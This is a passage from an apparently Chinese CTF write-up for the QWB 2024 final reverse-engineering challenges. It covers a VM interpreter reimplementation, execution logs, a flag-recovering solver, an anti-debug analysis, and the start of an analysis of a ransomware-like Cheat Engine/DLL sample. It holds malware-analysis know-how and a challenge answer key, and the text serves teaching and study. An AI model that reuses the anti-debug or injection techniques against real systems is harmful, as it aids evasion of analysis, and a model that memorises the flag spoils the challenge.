%d\n&quot;</span>,val);</span><br><span class="line">s.<span class="built_in">push</span>(val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd=<span class="built_in">open</span>(<span class="string">&quot;./quest&quot;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="type">size_t</span> ret=<span class="built_in">read</span>(fd,buffer,<span class="number">0x10000</span>);</span><br><span class="line"><span class="type">char</span> *PC=buffer;</span><br><span class="line"><span class="type">int</span> reg1,reg2,reg3;</span><br><span class="line"><span class="type">char</span> input[]=<span class="string">&quot;flag&#123;aaaaaaaaaaaaaaaaaaaaaaaaaa&#125;&quot;</span>;</span><br><span class="line"><span class="type">char</span> *p=input;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="type">char</span> opcode=*PC<span class="number">-0x10</span>;</span><br><span class="line"><span class="type">char</span> operand;</span><br><span class="line">PC++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2%reg3);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d %% %d=%d&quot;</span>,reg2,reg3,reg2%reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">operand=*PC++;</span><br><span class="line"><span class="built_in">pushstackval</span>(operand);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">reg1=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pop %d to reg1\n&quot;</span>,reg1);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d*%d=%d\n&quot;</span>,reg2,reg3,reg2*reg3);</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2*reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d+%d=%d\n&quot;</span>,reg2,reg3,reg2+reg3);</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2+reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;output a char %c\n&quot;</span>,reg1);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;get %d input\n&quot;</span>,p-input<span class="number">+1</span>,*p);</span><br><span class="line"><span class="built_in">pushstackval</span>(*p);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc (%d&gt;&gt;%d)&amp;1=%d\n&quot;</span>,reg2,reg3,(reg2&gt;&gt;reg3)&amp;<span class="number">1</span>);</span><br><span class="line"><span class="built_in">pushstackval</span>((reg2&gt;&gt;reg3)&amp;<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d^%d=%d\n&quot;</span>,reg2,reg3,reg2^reg3);</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2^reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">p++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;retval=%d\n&quot;</span>,reg1);</span><br><span class="line"><span class="keyword">return</span> reg1;</span><br><span class="line"><span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d-%d=%d\n&quot;</span>,reg2,reg3,reg2-reg3);</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2-reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">reg2=<span class="built_in">getstackval</span>();</span><br><span class="line">reg3=<span class="built_in">getstackval</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;calc %d/%d=%f\n&quot;</span>,reg2,reg3,reg2/reg3);</span><br><span class="line"><span class="built_in">pushstackval</span>(reg2/reg3);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;invalid op&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面节选一段log</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 0</span><br><span class="line">calc (102&gt;&gt;0)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 2</span><br><span class="line">calc 2*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 1</span><br><span class="line">calc (102&gt;&gt;1)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 3</span><br><span class="line">calc 3*1=3</span><br><span class="line">push val 3</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 2</span><br><span class="line">calc (102&gt;&gt;2)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 67</span><br><span class="line">calc 67*1=67</span><br><span class="line">push val 67</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 3</span><br><span class="line">calc (102&gt;&gt;3)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 37</span><br><span class="line">calc 37*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 4</span><br><span class="line">calc (102&gt;&gt;4)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 41</span><br><span class="line">calc 41*0=0</span><br><span class="line">push val 0</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 5</span><br><span class="line">calc (102&gt;&gt;5)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 11</span><br><span class="line">calc 11*1=11</span><br><span class="line">push val 11</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 6</span><br><span class="line">calc (102&gt;&gt;6)&amp;1=1</span><br><span class="line">push val 1</span><br><span class="line">push val 13</span><br><span class="line">calc 13*1=13</span><br><span class="line">push val 13</span><br><span class="line">get 1 input</span><br><span class="line">push val 102</span><br><span class="line">push val 7</span><br><span class="line">calc (102&gt;&gt;7)&amp;1=0</span><br><span class="line">push val 0</span><br><span class="line">push val 89</span><br><span class="line">calc 89*0=0</span><br><span class="line">push val 0</span><br><span class="line">calc 0+13=13</span><br><span class="line">push val 13</span><br><span class="line">calc 13+11=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+0=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+0=24</span><br><span class="line">push val 24</span><br><span class="line">calc 24+67=91</span><br><span class="line">push val 91</span><br><span class="line">calc 91+3=94</span><br><span class="line">push val 94</span><br><span class="line">calc 94+0=94</span><br><span class="line">push val 94</span><br><span class="line">push val 70</span><br><span class="line">calc 70^94=24</span><br><span class="line">push val 24</span><br><span class="line">get 2 input</span><br><span class="line">push val 108</span><br><span class="line">push val 0</span><br><span class="line">calc (108&gt;&gt;0)&amp;1=0</span><br></pre></td></tr></table></figure><p>最前面事实上就是输出一句话 <code>Thank for providing passcode, my ultimate secret box is checking...</code> 用的，跳过之后就能看到。其中最明显的应该能看到它频繁的取输入字符并做 <code>(x&gt;&gt;y)&amp;1</code> 的运算，y 从 <code>0~7</code>，不难想到，这是在一个一个取出输入字节的每一位，每一位都对应了一个权值。第一个字节可以看出来，从低位到高位权值分别为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 3 67 37 41 11 13 89</span><br></pre></td></tr></table></figure><p>而最后，它将所有权值相加，得到的结果和 70 做异或运算得到 24，将该值存入栈底。</p><p>而把log拉到最后发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">calc 137+71=208</span><br><span class="line">push val 208</span><br><span class="line">calc 208+39=247</span><br><span class="line">push val 247</span><br><span class="line">calc 247+120=367</span><br><span class="line">push val 367</span><br><span class="line">calc 367+22=389</span><br><span class="line">push val 389</span><br><span class="line">calc 389+119=508</span><br><span class="line">push val 508</span><br><span class="line">calc 508+89=597</span><br><span class="line">push val 597</span><br><span class="line">calc 597+22=619</span><br><span class="line">push val 619</span><br><span class="line">calc 619+218=837</span><br><span class="line">push val 837</span><br><span class="line">calc 837+203=1040</span><br><span class="line">push val 1040</span><br><span class="line">calc 1040+125=1165</span><br><span class="line">push val 1165</span><br><span class="line">calc 1165+125=1290</span><br><span class="line">push val 1290</span><br><span class="line">calc 1290+5=1295</span><br><span class="line">push val 1295</span><br><span class="line">calc 1295+118=1413</span><br><span class="line">push val 1413</span><br><span class="line">calc 1413+30=1443</span><br><span class="line">push val 1443</span><br><span class="line">calc 1443+59=1502</span><br><span class="line">push val 1502</span><br><span class="line">calc 1502+89=1591</span><br><span class="line">push val 1591</span><br><span class="line">calc 1591+213=1804</span><br><span class="line">push val 1804</span><br><span class="line">calc 1804+114=1918</span><br><span class="line">push val 1918</span><br><span class="line">calc 1918+35=1953</span><br><span class="line">push val 1953</span><br><span class="line">calc 1953+18=1971</span><br><span class="line">push val 1971</span><br><span class="line">calc 1971+18=1989</span><br><span class="line">push val 1989</span><br><span class="line">calc 1989+121=2110</span><br><span class="line">push val 2110</span><br><span class="line">calc 2110+65=2175</span><br><span class="line">push val 2175</span><br><span class="line">calc 2175+32=2207</span><br><span class="line">push val 2207</span><br><span class="line">calc 2207+221=2428</span><br><span class="line">push val 2428</span><br><span class="line">calc 2428+253=2681</span><br><span class="line">push val 2681</span><br><span class="line">calc 2681+348=3029</span><br><span class="line">push val 3029</span><br><span class="line">calc 3029+130=3159</span><br><span class="line">push val 3159</span><br><span class="line">calc 3159+92=3251</span><br><span class="line">push val 3251</span><br><span class="line">calc 3251+140=3391</span><br><span class="line">push val 3391</span><br><span class="line">calc 3391+24=3415</span><br><span class="line">push val 3415</span><br><span class="line">pop 3415 to reg1</span><br><span class="line">retval=3415</span><br></pre></td></tr></table></figure><p>我们所计算的第一个异或值，在最后一刻被加起来返回了。</p><p>而外面判断我们的输入是否正确，依赖于返回值是否为 0，因此我们要尽可能让每次异或值都相等，这里用个小技巧，将要输出的值打印到 stderr 中，再用重定向 <code>2&gt;out.txt</code> 就可以快速拿到一些值。</p><p>首先我们拿异或的目标值，在异或的 opcode 中加入 <code>fprintf(stderr,&quot;%d,&quot;,reg2);</code>，得到值。</p><p>然后拿每一个字节的每一位的权值，在 <code>*</code> 运算中加入 <code>fprintf(stderr,&quot;%d,&quot;,reg2);</code>，得到值。</p><p>最终根据逻辑，写出还原 passcode 的逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> v[]=&#123;</span><br><span class="line"><span class="number">2</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">89</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">47</span>,<span class="number">61</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">67</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">31</span>,<span class="number">97</span>,<span class="number">3</span>,<span class="number">41</span>,<span class="number">73</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">29</span>,<span class="number">97</span>,<span class="number">67</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">47</span>,<span class="number">83</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">71</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">89</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">83</span>,<span class="number">53</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">71</span>,<span class="number">43</span>,<span class="number">83</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">7</span>,<span class="number">73</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">89</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">89</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">73</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">59</span>,<span class="number">31</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">73</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">71</span>,<span class="number">11</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">79</span>,<span class="number">47</span>,<span class="number">83</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">37</span>,<span class="number">5</span>,<span class="number">73</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">71</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">71</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">29</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">71</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">47</span>,<span class="number">79</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">11</span>,<span class="number">43</span>,<span class="number">13</span>,<span class="number">79</span>,<span class="number">97</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">61</span>,<span class="number">3</span>,<span class="number">71</span>,<span class="number">7</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">79</span>,<span class="number">53</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">61</span>,<span class="number">31</span>,<span class="number">97</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">83</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">53</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">73</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">67</span>,<span class="number">3</span>,<span class="number">37</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">47</span>,<span class="number">59</span>,<span class="number">2</span>,<span class="number">37</span>,<span class="number">5</span>,<span class="number">73</span>,<span class="number">13</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">2</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">41</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">89</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">37</span>,<span class="number">73</span>,<span class="number">11</span>,<span class="number">43</span>,<span class="number">59</span>,&#125;;</span><br><span class="line"><span class="type">char</span> target[]=&#123;<span class="number">70</span>,<span class="number">56</span>,<span class="number">70</span>,<span class="number">77</span>,<span class="number">74</span>,<span class="number">90</span>,<span class="number">87</span>,<span class="number">82</span>,<span class="number">60</span>,<span class="number">67</span>,<span class="number">86</span>,<span class="number">95</span>,<span class="number">64</span>,<span class="number">94</span>,<span class="number">85</span>,<span class="number">66</span>,<span class="number">33</span>,<span class="number">69</span>,<span class="number">64</span>,<span class="number">98</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">94</span>,<span class="number">93</span>,<span class="number">90</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">65</span>,<span class="number">93</span>,<span class="number">96</span>,&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">checkval</span><span class="params">(<span class="type">int</span> i,<span class="type">int</span> pos)</span>&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)&#123;</span><br><span class="line">sum+=((i&gt;&gt;j)&amp;<span class="number">1</span>)*v[j+pos*<span class="number">8</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">size_t</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(target);i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0x20</span>;j&lt;<span class="number">127</span>;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(target[i]==checkval(j,i))&#123;</span><br><span class="line"><span class="built_in">putchar</span>(j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//s1mpl3_VM_us3s_link3d_l1st_st4ck</span></span><br></pre></td></tr></table></figure><p>输入后得到 <code>flag</code>。</p><img src="/2024/12/11/qwb2024_final_reverse/3.png" class=""><p>最后注意一下，这个反调试有点隐蔽，只要中了反调试就会修改 quest 这个文件，如果你不注意文件修改日期的话那么永远也算不出正确答案了。</p><h3 id="反调试手段分析"><a href="#反调试手段分析" class="headerlink" title="反调试手段分析"></a>反调试手段分析</h3><p>如何发现反调试？通常情况下，我们不会刻意地去注意反调试，只有当程序提示，报错，运行结果附加调试器与不附加调试器运行结果有较大差异时，才会去注意反调试。</p><p>这里程序初始化的时候会拉起反调试，不过需要非常仔细，能够敏锐地观察到 vm 的代码文件被修改了。</p><img src="/2024/12/11/qwb2024_final_reverse/4.png" class=""><p>首先确定反调试的位置，在main函数下断点，检查文件是否被修改。</p><img src="/2024/12/11/qwb2024_final_reverse/5.png" class=""><p>发现main函数之前反调试就运行完了，那么就要讲到 main 函数之前调用的代码了，在 Linux 中，会保存一个 init_array，它会保存一系列的函数指针，这些函数先于 main 被调用；同样的，在 windows 中也有类似的。</p><p>通过 initterm 函数交叉引用找到 First 指针，获取函数指针的起始地址。</p><img src="/2024/12/11/qwb2024_final_reverse/6.png" class=""><p>在指向的函数中，<code>sub_140001190</code> 是反调试的关键函数</p><img src="/2024/12/11/qwb2024_final_reverse/7.png" class=""><p>其中对 FileName 变量似乎在做一个异或解密的操作，异或的key是0x69，dump下来解密之后发现果然是在对目标文件进行操作。</p><img src="/2024/12/11/qwb2024_final_reverse/8.png" class=""><p>下面一系列就是写这个文件了，不过在这之前有一个关键判断 <code>qword_14002ED10</code>，这个函数指针保存了哪个函数，大概率是 IsDebuggerPresent 了，但是还是去验证一遍。</p><p>交叉找到赋值的位置，是在这之前执行的函数内容。</p><img src="/2024/12/11/qwb2024_final_reverse/9.png" class=""><p>下断点，看看能否断在这里，发现果真如我们所料</p><img src="/2024/12/11/qwb2024_final_reverse/10.png" class=""><p>那么这个反调试的过程就是在main函数之前先执行了两个函数，一个函数获取 IsDebuggerPresent 函数的地址保存在全局变量中，第二个函数调用这个 API 判断，如果的确被调试那么修改 quest 的文件内容。</p><p>对于这个绕过直接上 xdbg 的反调试插件 or 修改文件名，队爹就是直接上 xdbg 甚至感受不到反调试的存在，而我狂踩坑…</p><h2 id="UnsafeFile"><a href="#UnsafeFile" class="headerlink" title="UnsafeFile"></a>UnsafeFile</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><a href="UnsafeFile_fc430c76e4728fdfc829eee12723cbdd.zip">附件下载</a>，解压密码 <code>2024qwbfinal</code>。</p><blockquote><p>作者在此申明：本题目为类勒索病毒分析的题目，若要分析请一定一定不要在个人电脑或者公共电脑上运行此程序，请在虚拟机中调试分析，若因此造成任何的损失与作者无关。</p></blockquote><p>以下是原题目描述</p><blockquote><p>小Y玩游戏很菜，于是他找了个神秘人要了一个修改器文件，在开启功能后，发现他的一个重要文件居然被加密了，你能想办法帮他恢复吗？</p><p>请不要在物理机上运行题目中的任何文件，主办方对由此造成的任何损失不承担任何责任，如有需要请在虚拟机内进行运行和调试，解压密码:2024qwbfinal</p></blockquote><h3 id="基本分析-1"><a href="#基本分析-1" class="headerlink" title="基本分析"></a>基本分析</h3><p>压缩包给了两个文件，一个是 CT 脚本，一个是 .pdf.yr，看起来 .yr 是一个勒索了 pdf 类型文件的后缀。</p><p>先看看 CT 脚本，运行之后会拉起 DBK 驱动，运行计算器，并且看标题似乎是一个植物大战僵尸的修改器。</p><img src="/2024/12/11/qwb2024_final_reverse/11.png" class=""><p>其中比较主要的就是运行了一个 <code>decodeFunction</code> 去解密一段函数运行，这里可以直接用<a href="https://github.com/FeeeeK/CEFunctionDecoder">网上的脚本</a>还原这段。</p><p>运行后得到一个 luac 文件，luac 文件需要用另一个工具去还原为 lua 脚本，这里我是用的是 <code>unluac_2023_12_24.jar</code>，同样附上下载地址：<a href="https://sourceforge.net/projects/unluac/files/Unstable/">https://sourceforge.net/projects/unluac/files/Unstable/</a></p><img src="/2024/12/11/qwb2024_final_reverse/12.png" class=""><p>前面都是一些赋值函数，拉到最后发现几个有意思的字符串，其中 <code>C:\\system.dll</code> 引起了注意，于是去对应目录下，能找到一个 dll 文件，那么毫无疑问，剩下的就是对 system.dll 进行分析了，lua 脚本应该就是做注入用的。</p><p>dllmain 一个很标准的起线程的动作</p><img src="/2024/12/11/qwb2024_final_reverse/13.png" class=""><p>这个 StartAddress 就比较有意思，一直执着于判断自身某个内存的标志位，循环，而循环体内就是一直在 Sleep。</p><p>中间用 FindCrypt 发现 AES 的模式。</p><img src="/2024/12/11/qwb2024_final_reverse/14.png" class=""><p>那么毫无疑问，勒索的文件应该是使用 AES 加密的，交叉找到对应的函数，其中一个是 <code>10001840</code>，另一个是 <code>10001790</code>。</p><p>静态分析比较难了，下面开始动态分析。</p><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>因为是个 dll，还不像 exe 那样好调试，这里我写了一个简单的 demo</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span 